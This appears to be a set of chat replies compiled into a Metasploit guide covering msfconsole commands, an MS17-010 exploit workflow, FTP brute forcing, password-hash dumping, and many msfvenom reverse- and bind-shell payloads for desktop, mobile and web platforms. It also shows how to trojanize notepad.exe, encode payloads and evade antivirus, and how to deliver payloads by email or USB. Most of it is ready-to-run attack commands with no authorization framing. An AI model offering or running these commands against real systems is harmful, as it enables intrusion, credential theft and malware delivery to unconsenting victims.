# msfconsole-use
Here’s a **comprehensive guide** to using `msfconsole` in Metasploit, including its help options and examples.

---

## **Launching msfconsole**
```bash
msfconsole
```

Once inside, you can access the help menu by typing:
```bash
help
```
or:
```bash
? 
```

This will display a list of commands available in the Metasploit console.

---

## **Key msfconsole Commands**
### General Commands
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `banner`        | Displays a random Metasploit banner.                                                             | `banner`                              |
| `version`       | Displays the Metasploit Framework version.                                                       | `version`                             |
| `history`       | Shows command history.                                                                           | `history`                             |
| `sessions`      | Lists all active sessions.                                                                       | `sessions -i 1`                       |
| `exit`          | Exits the console.                                                                               | `exit`                                |

---

### Searching Modules
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `search`        | Searches for a specific exploit, payload, or auxiliary module.                                   | `search smb`                          |
| `info`          | Displays detailed information about a specific module.                                           | `info exploit/windows/smb/ms17_010`   |

---

### Using Modules
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `use`           | Selects a specific module for use.                                                               | `use exploit/windows/smb/ms17_010`    |
| `show`          | Displays available payloads, targets, options, or modules.                                       | `show payloads`                       |
| `set`           | Configures an option for the selected module.                                                    | `set RHOSTS 192.168.1.10`             |
| `unset`         | Clears a set option.                                                                             | `unset RHOSTS`                        |
| `exploit`       | Executes the selected module.                                                                    | `exploit`                             |
| `run`           | Alias for `exploit`.                                                                             | `run`                                 |

---

### Payload Management
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `generate`      | Creates a payload.                                                                               | `generate -t exe -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444` |
| `msfvenom`      | Used to craft custom payloads outside of msfconsole.                                             | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe` |

---

### Auxiliary Modules
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `use`           | Select an auxiliary module.                                                                      | `use auxiliary/scanner/ftp/ftp_login` |
| `run`           | Execute the auxiliary module.                                                                    | `run`                                 |

---

### Managing Exploits and Sessions
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `jobs`          | Lists running jobs (background tasks).                                                           | `jobs`                                |
| `kill`          | Terminates a specific job.                                                                       | `kill 1`                              |
| `sessions`      | Interact with active sessions.                                                                   | `sessions -i 1`                       |
| `background`    | Backgrounds an active session.                                                                   | `background`                          |

---

### Post-Exploitation
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `use`           | Select a post-exploitation module.                                                               | `use post/windows/gather/hashdump`    |
| `set`           | Configure options for the module.                                                                | `set SESSION 1`                       |
| `run`           | Execute the post-exploitation module.                                                            | `run`                                 |

---

### Networking
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `route`         | Manage routing for pivoting.                                                                     | `route add 192.168.2.0/24 1`          |
| `arp`           | View or modify the ARP cache.                                                                    | `arp -a`                              |

---

### Database Management
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `db_status`     | Check the status of the database.                                                                | `db_status`                           |
| `workspace`     | Manage multiple workspaces.                                                                      | `workspace add test_workspace`        |
| `hosts`         | List discovered hosts.                                                                           | `hosts`                               |
| `services`      | List services discovered during scans.                                                           | `services`                            |

---

### Meterpreter-Specific Commands
| Command         | Description                                                                                      | Example                               |
|------------------|--------------------------------------------------------------------------------------------------|---------------------------------------|
| `getuid`        | Shows the user ID of the current session.                                                        | `getuid`                              |
| `sysinfo`       | Displays system information of the target.                                                       | `sysinfo`                             |
| `download`      | Downloads a file from the target system.                                                         | `download /etc/passwd`                |
| `upload`        | Uploads a file to the target system.                                                             | `upload shell.exe`                    |
| `shell`         | Drops to a command shell on the target.                                                          | `shell`                               |
| `exit`          | Exits the Meterpreter session.                                                                   | `exit`                                |

---

### Examples of Common Workflows
1. **Exploit SMB Vulnerability (MS17-010)**
   ```bash
   use exploit/windows/smb/ms17_010
   set RHOSTS 192.168.1.100
   set LHOST 192.168.1.10
   set PAYLOAD windows/meterpreter/reverse_tcp
   exploit
   ```

2. **Run an FTP Brute Force Attack**
   ```bash
   use auxiliary/scanner/ftp/ftp_login
   set RHOSTS 192.168.1.0/24
   set USER_FILE /usr/share/wordlists/usernames.txt
   set PASS_FILE /usr/share/wordlists/passwords.txt
   run
   ```

3. **Create a Reverse Shell Payload**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > reverse_shell.exe
   ```

4. **Post-Exploitation: Dump Password Hashes**
   ```bash
   use post/windows/gather/hashdump
   set SESSION 1
   run
   ```

---

### Additional Tips
- Use `help <command>` for more details on any command.
  ```bash
  help search
  ```
- To save progress or configurations:
  ```bash
  save
  ```
- Always update Metasploit to stay current:
  ```bash
  msfupdate
  ```

Let me know if you'd like further clarification or a deeper dive into any specific commands or workflows!

Here are more **examples for creating payloads** using `msfvenom`. These examples cover various platforms, formats, and use cases.

---

### **Windows Payloads**

#### 1. Reverse TCP Meterpreter Payload
Creates a reverse TCP Meterpreter payload for Windows:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > reverse_shell.exe
```

#### 2. Bind Shell Payload
Creates a bind shell payload that waits for connections on a specified port:
```bash
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > bind_shell.exe
```

#### 3. Staged vs. Stageless Meterpreter Payload
- **Staged** (smaller payload, requires communication with Metasploit):
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > staged_meterpreter.exe
  ```
- **Stageless** (larger payload, standalone):
  ```bash
  msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > stageless_meterpreter.exe
  ```

---

### **Linux Payloads**

#### 4. Reverse TCP Shell
Generates a reverse TCP shell payload for Linux:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > reverse_shell.elf
```

#### 5. Bind Shell Payload
Generates a bind shell payload for Linux:
```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf > bind_shell.elf
```

---

### **MacOS Payloads**

#### 6. Reverse TCP Meterpreter
Creates a reverse TCP Meterpreter payload for MacOS:
```bash
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho > reverse_shell.macho
```

---

### **Android Payloads**

#### 7. Reverse TCP Meterpreter Payload
Generates an APK file with a reverse TCP Meterpreter payload:
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 R > malicious_app.apk
```

#### 8. Custom Package Name
You can add a custom package name:
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 --platform android -a dalvik -o malicious_app.apk
```

---

### **iOS Payloads**

#### 9. Reverse TCP Shell
Creates a reverse shell payload for iOS:
```bash
msfvenom -p apple_ios/aarch64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho > reverse_shell.macho
```

---

### **Web Payloads**

#### 10. PHP Reverse Shell
Generates a PHP reverse shell script:
```bash
msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw > reverse_shell.php
```

#### 11. ASP Reverse Shell
Creates a reverse shell payload in ASP:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f asp > reverse_shell.asp
```

#### 12. JSP Reverse Shell
Generates a reverse shell for Java web servers:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > reverse_shell.jsp
```

---

### **Multi-Platform Payloads**

#### 13. Python Reverse Shell
Generates a Python reverse shell script:
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > reverse_shell.py
```

---

### **Encoders**

#### 14. Encoding the Payload
To evade basic antivirus detection, encode your payload using encoders:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded_reverse_shell.exe
```
- `-e`: Specifies the encoder.
- `-i`: Number of iterations for encoding.

---

### **Custom Payload Options**

#### 15. Add Custom Commands
Customize options for better control:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 EXITFUNC=thread -f exe > custom_reverse_shell.exe
```

#### 16. Use Templates
To inject a payload into an existing executable:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x notepad.exe -k -f exe > infected_notepad.exe
```

---

### **Shellcode Payloads**

#### 17. Shellcode for Exploits
Generates shellcode for manual injection:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c
```

#### 18. Shellcode in Hex Format
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f hex
```

---

### **Payload Formats**

- **EXE**: For Windows executable files.
- **ELF**: For Linux binary files.
- **APK**: For Android applications.
- **MACHO**: For macOS binaries.
- **RAW**: For custom scripts like PHP, Python, or ASP.
- **HEX**: For embedding shellcode into exploits.
- **C**: For use in C programs.
- **JS**: For injecting JavaScript.

---

### **Testing the Payload**
1. Start a listener in Metasploit:
   ```bash
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.10
   set LPORT 4444
   exploit
   ```
2. Deliver the payload to the target (via email, web server, USB, etc.).
3. Wait for the connection in Metasploit.

---

Let me know if you need additional examples or help with specific scenarios!

### **Encoders in Metasploit**

Encoders in Metasploit are used to obfuscate payloads to bypass detection mechanisms, such as antivirus software and intrusion detection systems (IDS). Encoding helps avoid detection by reformatting the payload without altering its functionality.

---

### **How Encoders Work**
1. **Obfuscation**: Encoders transform the payload into a new format to make it less recognizable.
2. **Decoding at Execution**: Once the encoded payload is executed on the target system, it decodes itself back to the original form.
3. **Iteration**: Encoders can be applied multiple times (`-i` flag) to increase complexity.

---

### **Commonly Used Encoders**
Here are some popular encoders and their purposes:
- **x86/shikata_ga_nai**: One of the most popular encoders. Polymorphic and highly effective for Windows.
- **cmd/powershell_base64**: Encodes payloads in Base64 for PowerShell delivery.
- **php/base64**: Encodes PHP payloads in Base64.
- **ruby/base64**: Encodes Ruby payloads in Base64.
- **x86/call4_dword_xor**: XOR-based encoder for x86 architectures.
- **x86/bloxor**: A polymorphic XOR-based encoder.

---

### **Encoding Syntax**
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -e <ENCODER> -i <ITERATIONS> -f <FORMAT> -o <OUTPUT>
```

- `-e`: Specifies the encoder.
- `-i`: Number of iterations to encode.
- `-f`: Output format (e.g., exe, elf, raw).
- `-o`: Output file name.

---

### **Examples of Encoding Payloads**

#### **1. Using x86/shikata_ga_nai Encoder**
This is the most common encoder for Windows payloads:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
```
- **LHOST**: Attacker's IP address.
- **LPORT**: Listening port.
- **-i 5**: Encodes the payload 5 times.

#### **2. PHP Payload with Base64 Encoding**
Useful for delivering web-based payloads:
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e php/base64 -f raw -o encoded_payload.php
```

#### **3. Linux ELF Payload with XOR Encoder**
Encode a Linux ELF payload with XOR encoding:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/call4_dword_xor -i 3 -f elf -o encoded_payload.elf
```

#### **4. PowerShell Payload Encoded in Base64**
Encode a PowerShell payload for delivery via command-line:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e cmd/powershell_base64 -f raw -o encoded_powershell.ps1
```

#### **5. Ruby Payload Encoded in Base64**
Encode a Ruby payload for custom scripts:
```bash
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e ruby/base64 -f raw -o encoded_payload.rb
```

#### **6. Python Payload with Base64 Encoding**
Encode a Python payload for manual injection:
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e cmd/base64 -f raw -o encoded_payload.py
```

---

### **Customizing Encoding**
#### **7. Add Exit Function**
You can specify the exit function (process/thread):
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 EXITFUNC=thread -e x86/shikata_ga_nai -i 3 -f exe -o thread_exit_payload.exe
```

#### **8. Multi-Iteration Encoding**
Encode multiple times to increase obfuscation:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o multi_encoded_payload.exe
```

---

### **Testing the Encoded Payload**
1. Set up a Metasploit listener:
   ```bash
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.10
   set LPORT 4444
   exploit
   ```

2. Deliver the payload to the target system.

---

### **Antivirus Evasion Tips**
- **Use Polymorphic Encoders**: Use encoders like `x86/shikata_ga_nai`.
- **Chain Multiple Encoders**: Combine multiple encoders for better obfuscation.
- **Modify Payloads**: Add dummy instructions or alter payload signatures.
- **Use Third-Party Tools**: Tools like Veil or Shellter can further enhance evasion.

---

### **List of Available Encoders**
To view all available encoders in Metasploit:
```bash
msfvenom --list encoders
```

Example output:
```plaintext
Encoders
========
Name                          Rank       Description
----                          ----       -----------
cmd/powershell_base64         excellent  Command Powershell Base64
php/base64                    excellent  PHP Base64 Encoder
ruby/base64                   excellent  Ruby Base64 Encoder
x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
x86/bloxor                    good       Polymorphic Block XOR Encoder
x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
x64/xor_dynamic               normal     Dynamic key XOR Encoder
```

---

Let me know if you need more examples, tips, or help with specific encoders!
